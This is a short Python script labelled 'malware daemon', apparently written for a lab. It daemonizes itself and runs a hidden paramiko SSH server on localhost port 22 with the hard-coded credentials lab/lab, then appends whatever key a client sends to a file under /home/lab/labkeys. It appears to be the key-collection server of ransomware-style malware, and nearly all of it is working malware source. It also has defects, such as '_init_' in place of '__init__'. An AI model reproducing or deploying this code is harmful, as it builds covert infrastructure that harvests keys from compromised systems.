#!/usr/bin/python3

# malware daemon()
import socket
import paramiko
import threading
import sys
import os
import signal
import argparse


hostKey = paramiko.RSAKey(filename='/home/lab/.ssh/id_rsa')  # supplied with paramiko


class Server(paramiko.ServerInterface):
    def _init_(self):
        # self.event = threading.Event()
        self.key = hostKey

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'lab') and (password == 'lab'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


def signalHandler(signalNumber, frame):
    while True:
        try:
            pid, status = os.waitpid(-1, os.WNOHANG)
        except OSError:
            return
        if pid == 0:
            return


def clientHandler(clientSocket):
    key = clientSocket.recv(1024)
    with open("/home/lab/labkeys/key.key", "ab") as keyFile:
        keyFile.write(key + "\n".encode("ascii"))


def closeDaemon():
    sys.stdout.write("Closing Daemon...")
    sys.exit(0)


def daemon():
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.stderr.write("First fork failed!")

    os.chdir('/')
    os.umask(0)
    os.setsid()

    #redirect file descriptors
    sys.stdout.flush()
    sys.stderr.flush()
    si = open("/home/lab/malwareIn.log", "a+")
    so = open("/home/lab/malOut.log", "a+")
    se = open("/home/lab/malErr.log", "a+")
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.stderr.write("Second Fork failed!")

    try:
        semFile = open("/var/run/malDaemon.lock", "w")
        semFile.seek(0)
        semFile.truncate()
        semFile.write(str(os.getpid()))
    except IOError as e:
        sys.stderr.write("Exception caught: Unable to write to file  ", e)
    except Exception as e:
        sys.stderr.write("Error: ", e)
    else:
        semFile.close()

    try:
        socketObject = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socketObject.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        socketObject.bind(('127.0.0.1', 22))
        socketObject.listen(100)
        sys.stdout.write('[+] Listening for connection ...')
        os.setuid(1000)
        signal.signal(signal.SIGCHLD, signalHandler)
        signal.signal(signal.SIGHUP, closeDaemon)
        # os.setgid(0)
    except Exception as e:
        sys.stdout.write('[-] Bind failed: ' + str(e))
        sys.exit(1)
    try:
        while True:
            client, addr = socketObject.accept()

            pid = os.fork()

            if pid ==0:
                tunnelObject = paramiko.Transport(client)
                tunnelObject.add_server_key(hostKey)
                server = Server()
                try:
                    tunnelObject.start_server(server=server)
                except paramiko.SSHException as x:
                    print('[-] SSH negotiation failed.')
                channelObject = tunnelObject.accept(20)
                clientHandler(channelObject)
                tunnelObject.close()
                sys.exit(0)
            else:
                client.close()
    except Exception as e:
        sys.stdout.write('[-] Listen/bind/accept failed: ' + str(e))
        sys.exit(1)


if __name__ == '__main__':
    switchParser = argparse.ArgumentParser(description="Malware Daemon")
    switchParser.add_argument("start", help="Start or stop", nargs="?", choices=("start", "stop"), default="start")
    switch = switchParser.parse_args()
    if switch.start == "start":
        print(f"Starting Daemon...")
        daemon()
    else:
        print("Killing the daemon")
        file = open("/var/run/malDaemon.lock", "r")
        pid = int(file.readline())
        os.kill(pid, signal.SIGHUP)
